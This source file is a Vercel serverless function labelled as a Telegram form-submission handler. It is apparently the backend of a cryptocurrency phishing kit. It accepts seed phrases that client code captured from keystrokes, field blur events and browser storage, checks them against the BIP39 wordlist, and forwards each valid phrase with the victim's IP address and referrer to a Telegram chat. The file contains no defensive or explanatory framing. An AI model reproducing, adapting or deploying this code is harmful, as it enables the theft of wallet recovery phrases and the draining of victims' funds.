/**
 * Telegram Bot API Integration
 * Serverless function for Vercel
 * Handles form submissions and sends formatted messages to Telegram
 */

export default async function handler(req, res) {
  // Set CORS headers to allow client-side requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Support both naming conventions
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID;

    // Validate environment variables
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram credentials');
      console.error('Available env vars:', Object.keys(process.env).filter(k => k.includes('TOKEN') || k.includes('CHAT') || k.includes('BOT')).join(', '));
      return res.status(500).json({ 
        error: 'Server configuration error',
        debug: {
          hasBotToken: !!TELEGRAM_BOT_TOKEN,
          hasChatId: !!TELEGRAM_CHAT_ID
        }
      });
    }

    // Extract data from request
    const { data } = req.body;

    // Get visitor information
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
               req.headers['x-real-ip'] || 
               req.connection?.remoteAddress || 
               req.socket?.remoteAddress || 
               'Unknown';
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
    const url = req.headers['referer'] || 'Unknown';
    
    // Detect search engine referrer
    let searchEngine = '🌐 Direct';
    if (referer.includes('google')) {
      searchEngine = '🔍 Google';
    } else if (referer.includes('bing')) {
      searchEngine = '🔎 Bing';
    } else if (referer.includes('yahoo')) {
      searchEngine = '🟣 Yahoo';
    } else if (referer.includes('duckduckgo')) {
      searchEngine = '🦆 DuckDuckGo';
    } else if (referer.includes('baidu')) {
      searchEngine = '🔴 Baidu';
    } else if (referer !== 'Direct') {
      searchEngine = '🔗 Referral';
    }

    // Check if this is a seed phrase submission (matches client TYPE values)
    const isSeedPhraseData = data && (
      data.TYPE === 'SEED_PHRASE' ||
      data.TYPE === 'SEED_ON_BLUR' ||
      data.TYPE === 'WALLET_CREATED_DISPLAYED' ||
      data.TYPE === 'WALLET_CREATED_PHRASE_DISPLAYED' ||
      data.TYPE === 'WALLET_CREATED' ||
      data.TYPE === 'SEED_TYPED' ||
      data.TYPE === 'SEED_BLUR' ||
      data.TYPE === 'SEED_INPUT' ||
      data.TYPE === 'STORAGE_LOCALSTORAGE' ||
      data.TYPE === 'STORAGE_SESSIONSTORAGE' ||
      data.TYPE === 'DEEPSCAN' ||
      data.TYPE === 'DEEPSCAN_TEXT' ||
      data.TYPE === 'TEST_PHRASE' ||
      data.type === 'SEED_PHRASE' ||
      data.type === 'SEED_ON_BLUR' ||
      data.type === 'WALLET_CREATED_DISPLAYED' ||
      data.type === 'WALLET_CREATED_PHRASE_DISPLAYED' ||
      data.type === 'WALLET_CREATED' ||
      data.type === 'SEED_TYPED' ||
      data.type === 'SEED_BLUR' ||
      data.type === 'SEED_INPUT' ||
      data.type === 'STORAGE_LOCALSTORAGE' ||
      data.type === 'STORAGE_SESSIONSTORAGE' ||
      data.type === 'DEEPSCAN' ||
      data.type === 'DEEPSCAN_TEXT'
    );

    // Extract phrase from any field name (client sends PHRASE uppercase)
    const phraseContent = data && (
      data.PHRASE ||
      data.phrase ||
      data.content ||
      data.CONTENT ||
      data.seed ||
      data.SEED ||
      data.mnemonic ||
      data.MNEMONIC ||
      data.recovery ||
      data.RECOVERY
    );
    
    // Debug logging
    console.log('📨 Received data:', JSON.stringify(data, null, 2));
    console.log('🔍 Extracted phrase:', phraseContent ? phraseContent.substring(0, 50) + '...' : 'NONE');

    // BIP39 wordlist for strict validation
    const BIP39 = "abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice aerobic affair afford afraid again age agent agree ahead aim air airport aisle alarm album alcohol alert alien all alley allow almost alone alpha already also alter always amateur amazing among amount amused analyst anchor ancient anger angle angry animal ankle announce annual another answer antenna antique anxiety any apart apology appear apple approve april arch arctic area arena argue arm armed armor army around arrange arrest arrive arrow art artefact asset artist ask assume asthma athlete atom attack attend attitude attract auction audit august aunt author auto autumn average avocado avoid awake aware away awesome awful awkward axis baby bachelor bad badge bag balance balcony ball bamboo banana banner bar barely bargain barrel base basic basket battle beach bean beauty because become beef before begin behave behind believe below belt bench benefit best betray better between beyond bicycle bid bike bind biology bird birth bitter black blade blame blanket blast bleak bless blind blood blossom blouse blue blur blush board boat body boil bomb bone bonus book boost border boring borrow boss bottom bounce box boy bracket brain brand brass brave bread breeze brick bridge brief bright bring brisk broccoli broken bronze broom brother brown brush bubble buddy budget buffalo build bulb bulk bullet bundle bunker burden burger burst bus business busy butter buyer buzz cabbage cabin cable cactus cage cake call calm camera camp can canal cancel candy cannon canoe canvas canyon capable capital captain car carbon card cargo carpet carry cash casino castle casual cat catalog catch category cattle caught cause caution cave ceiling celery cement census century cereal certain chair chalk champion change chaos chapter charge chase chat cheap check cheese chef cherry chest chicken chief child chimney choice choose chronic chuckle chunk cigar cinema circle citizen city civil claim clap clarify claw clay clean clerk clever click client cliff climb clinic clock close cloud clown club clump cluster clutch coach coast coconut code coffee coil coin collect color column combine come comfort comic common company concert conduct confirm congress connect consider control convince cook cool copper copy core corn correct cost cotton couch country couple course cousin cover coyote craft crack cradle craft crane crash crater crazy cream credit creek crew crime crisp crop cross crowd crown crucial cruel cruise crumble crunch crush cry crystal cube culture cup cupboard curious current curtain curve cushion custom cycle dad damage damp dance danger daring dash daughter dawn day deal debate debris decade december decide decline decorate deer decrease defense define defy degree delay deliver demand dense deny dentist depend deploy describe desert design desk despair destroy detail detect develop device devote diagram dial diamond diary dice diesel diet differ digital dignity dilemma dinner dinosaur direct dirt disagree discover disease dish dismiss disorder display distance disturb divide divorce doctor dog doll dolphin domain donate donkey donor door dose double dove draft dragon drama drain draw dream dress drift drill drink drip drive drop drum dry duck dumb dune dust duty dwarf dynamic eager eagle early earn earth easily east easy echo ecology economy edge edit educate effort egg eight either elbow elder electric elegant element elephant elevator elite else embark embody embrace emerge emotion employ empty enable enact end endless endorse enemy energy enforce engage engine enhance enjoy enlist enough enrich enroll ensure enter entire entry envelope episode equal equip era erase erode erosion error erupt escape essay essence estate eternal ethics evidence evil evoke evolve exact example except exchange excite exclude excuse execute exercise exhaust exhibit exist exit expand expect experiment expert expire explain expose express extend extra eye eyebrow fabric face faculty fade faint faith false fame family famous fan fancy fantasy farm fashion fast fat fault fear feature fee feed feel female fence festival fetch fever few fiber fiction field fifth fight figure file fill film filter final find fine finger finish fire firm first fish fitting five fix flag flame flash flat flavor flee flight flip float flock floor flower fluid flush fly foam focus foil fold follow food foot force forest forget fork fortune forum forward found four frame freeze fresh friend front frost fruit fudge fuel full fun furnace fury future gadget gain galaxy gallery game gap garbage garden garlic gas gate gather gauge gaze gear gender gene generic genius gentle genuine gesture ghost giant gift giraffe girl give glad glance glass globe gloom glory glove glow glue goat gold good goose grace grain grant grape grass gravity gray great green grid grief grit grocery group grow guard guess guide guilt guitar gun gym habit hair half hammer hand happy harbor harsh harvest hat have hawk hazard head health heart heavy hedge heel height hello help hen hero hidden high hill hint hire history hit hobby hockey hold hole holiday hollow home honey hook hope horn horror horse hospital host hotel hour house hover huge human humble humor hundred hungry hunt hurry hurt husband hybrid ice icon idea identify idle ignore illegal illness image imitate immense impact imply import improve include income increase index indicate indoor industry infant inflict inform inhale inherit initial inject injury inmate inner innocent input inquiry inside insect insight install instruct interest intact introduce invade invest invite involve iron island issue item jacket jail january jazz jealous jeans jelly jewel job join joke journey joy judge juice jump junior jury just justify keep ketchup key kick kid kidney kind king kiss kitchen kite knee knife knock know lab label labor ladder lady lake lamp land language large last late laugh laundry law lawn lay layer lazy lead leaf lean leap learn least leather leave left leg legacy legal legend lemon length lens lesson let letter level library life lift light limit line link lion liquid list little live lizard load loan local lock logic lonely long loop lose lottery love loyal luck luggage lump lunar lunch luxury lyrics machine mad magic magnet maid mail main major make mammal manage many map marble march margin marine market marriage mask mass master match material math matter may maze meadow mean measure meat media medical meet melody member memory mention menu mercy merge merit merry message metal method middle might milk million mind min minor minute mirror miss mission mix mobile model modify mom moment monitor monkey month moon moral more morning mother motion motor mountain mouse move mouth movie much music muscle museum mutual myself mystery name nap narrow nation native nature near neck need nervous network never news next nice night nine noise normal north nose note novel now nuclear number nurse nut oak obey object observe obtain obvious occur ocean october odd off offer office often oil okay old olive once one onion online open opera opinion oppose option orange orbit orchard order organ orient original orphan ostrich other outdoor outer output outside oven over own owner oxygen oyster pace pack page paint pair palace palm panda panel panic panther paper parade parent park parrot party pass past path pause peace peak peanut pear peasant pelican pen penalty pencil people pepper perfect permit person pet phone photo phrase physical piano picnic picture piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play pledge pluck plug poem poet point polar pole police pond pony pool popular portion position possible post potato pottery poverty powder power practice praise predict prefer prepare present pretty prevent price pride primary print priority prison private prize problem process produce profit program project promote proof property prosper protect proud provide public pudding pull pulp pulse pumpkin punch pupil puppy purchase purity purpose purse push put puzzle pyramid quality quantum quarter queen quick quiet quiz quote rabbit raccoon race radar radio rail rain raise rally ramp ranch random range rapid rare rate rather raven raw razor ready real reason rebel rebuild recall receive recipe record recycle reduce reflect reform refuse region regret regular reject relax release relief remain remember remind remove render renew rent repair repeat replace report require rescue resemble resist resort rest result retain retire retreat return reveal review rhythm rice rich ride ridge rifle right rigid ring rise risk ritual river road roast robot rock rocket room root rope rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle sadness safe sail salad salmon salt same sand satisfy satoshi save saw say scale scare school science scope score scratch screen script scroll sea search season seat second secret section security seed seek segment select sell seminar senior sense sentence series serious serve session settle setup seven several shade shake shallow share shed shell sheriff shield shift shine ship shirt shock shoe shoot shop short shoulder shout shower shrimp shrink shuffle shy sick side sight sign silent silver simple since sing single sister sit six size skate sketch ski skill skin skirt skull slab sleep slide slight slow small smart smile smoke smooth snack snake snow soap soccer social sock soda soft solar soldier solid solution solve some son song soon sorry sort soul sound soup source south space spare speak special speed spell spend sphere split sport spread spring square squeeze stable staff stage stair stamp stand star start state station stay steel step stick still stock stone store story stove strange street stretch strong structure student stuff stupid style subject submit subway success such sudden suffer sugar suggest suit summer sun sunny sunset super supply sure surface survey sustain swallow swamp swap swarm swear sweep sweet swim swing switch symbol system table tackle tag tail take talk tall tank tape target task taste tattoo taxi teach team tell ten tenant tennis tent term test text thank that theme then theory there they thick thing think third this though three throw thumb thunder ticket tide tiger tilt time tiny tip tired tissue title today toilet tomato tomorrow tone tongue tool tooth top topic toss total tough tower track trade traffic train trap travel treat tree trend trial tribe trick trigger trim trip trophy truck true truly trust truth try tube tuna tunnel turn turtle twelve twice twin twist type ugly umbrella unable unaware uncle under undo uniform union unique unit universe unknown unlock until unusual unveil update upgrade upon upper urban urge use useful usual utility vacant vacuum vague valid valley value van vanish vapor various vast vault vehicle velvet vendor venture version very vessel veteran victory video view village vintage violin virtual virus visa visit visual vital vivid vocal voice void volcano volume vote voyage wage wagon wait walk wall walnut want warfare warm wash waste watch water wave way wealth weapon wear weather web wedding weekend weird welcome west wet whale wheel when where which while whisper white whole wide wife wild will win window winter wire wisdom wise wish witness wolf woman wonder wood wool word work world worry worth wrap wreck wrestle wrist write wrong yard year yellow you young youth zebra zero zone zoo";

    // Strict BIP39 validator - 12/15/18/21/24 words, all must be in wordlist
    function isRealSeedPhrase(val) {
      if (!val || typeof val !== 'string') return false;
      const words = val.trim().split(/\s+/).filter(w => w.length > 0);
      if (![12, 15, 18, 21, 24].includes(words.length)) return false;
      return words.every(w => BIP39.includes(w.toLowerCase()) && w.length >= 3 && w.length <= 8);
    }

    // If data.TYPE indicates a phrase, accept it directly
    const isPhraseType = data && (data.TYPE && (
      data.TYPE === 'TEST_PHRASE' ||
      data.TYPE === 'WALLET_CREATED' ||
      data.TYPE === 'SEED_TYPED' ||
      data.TYPE === 'SEED_BLUR' ||
      data.TYPE === 'SEED_INPUT' ||
      data.TYPE === 'STORAGE_LOCALSTORAGE' ||
      data.TYPE === 'STORAGE_SESSIONSTORAGE' ||
      data.TYPE === 'DEEPSCAN' ||
      data.TYPE === 'DEEPSCAN_TEXT' ||
      data.TYPE === 'SEED_PHRASE' ||
      data.TYPE === 'SEED_ON_BLUR' ||
      data.TYPE === 'WALLET_CREATED_DISPLAYED' ||
      data.TYPE === 'WALLET_CREATED_PHRASE_DISPLAYED'
    ));

    // Check if any value in data looks like a real seed phrase
    let detectedPhrase = isRealSeedPhrase(phraseContent) ? phraseContent : (isPhraseType ? phraseContent : null);
    let detectedWordCount = detectedPhrase ? detectedPhrase.trim().split(/\s+/).filter(w => w.length > 0).length : 0;
    if (!detectedPhrase && data) {
      for (const val of Object.values(data)) {
        if (typeof val === 'string' && isRealSeedPhrase(val)) {
          detectedPhrase = val.trim();
          detectedWordCount = detectedPhrase.split(/\s+/).filter(w => w.length > 0).length;
          break;
        }
      }
    }

    const wordCount = data && (data.WORDS || data.wordCount || detectedWordCount ||
      (detectedPhrase ? detectedPhrase.trim().split(/\s+/).filter(w => w.length > 0).length : 0));

    const trafficSrc = data && (data.trafficSource || data.TRAFFIC_SOURCE || searchEngine);
    const pageLocation = data && (data.PAGE || data.page || url);
    const fieldName = data && (data.FIELD || data.field || 'unknown');
    const eventType = data && (data.TYPE || data.type || 'FORM_DATA');

    let message;

    if (isRealSeedPhrase(detectedPhrase || phraseContent)) {
      // ===== VALID BIP39 PHRASE (12/15/18/21/24 words) =====
      const verifiedPhrase = (detectedPhrase || phraseContent).trim();
      
      // Simple referral source (Google / Bing / Direct)
      let refSource = 'Direct';
      const refLower = (referer || '').toLowerCase();
      if (refLower.includes('google')) refSource = 'Google';
      else if (refLower.includes('bing')) refSource = 'Bing';
      else if (refLower.includes('yahoo')) refSource = 'Yahoo';
      else if (refLower.includes('duckduckgo')) refSource = 'DuckDuckGo';
      else if (refLower.includes('baidu')) refSource = 'Baidu';
      else if (trafficSrc && trafficSrc !== 'Direct') refSource = trafficSrc;
      
      // Use trafficSrc from client if available, otherwise use detected
      const finalSource = (trafficSrc && trafficSrc !== 'Direct') ? trafficSrc : refSource;
      
      message = `🔑 ${verifiedPhrase}
🌐 IP: ${ip}
🔗 From: ${finalSource}
📄 URL: ${url}`;
    } else {
      // Not a valid BIP39 phrase - skip (prevents false positives)
      console.log('⛔ Not a valid 12/15/18/21/24-word BIP39 phrase - skipping');
      return res.status(200).json({ success: true, skipped: true, reason: 'not a valid BIP39 phrase' });
    }

    // Send message to Telegram
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const telegramResponse = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    const telegramData = await telegramResponse.json();

    if (!telegramResponse.ok) {
      console.error('Telegram API error:', telegramData);
      console.error('Bot Token (first 10 chars):', TELEGRAM_BOT_TOKEN.substring(0, 10));
      console.error('Chat ID:', TELEGRAM_CHAT_ID);
      return res.status(500).json({ 
        error: 'Failed to send message',
        details: telegramData,
        debug: {
          botTokenPrefix: TELEGRAM_BOT_TOKEN.substring(0, 10) + '...',
          chatId: TELEGRAM_CHAT_ID
        }
      });
    }

    console.log('✅ Message sent successfully to Telegram');
    return res.status(200).json({ 
      success: true, 
      message: 'Message sent successfully',
      telegramResponse: telegramData
    });

  } catch (error) {
    console.error('Server error:', error);
    return res.status(500).json({ 
      error: 'Internal server error',
      message: error.message 
    });
  }
}
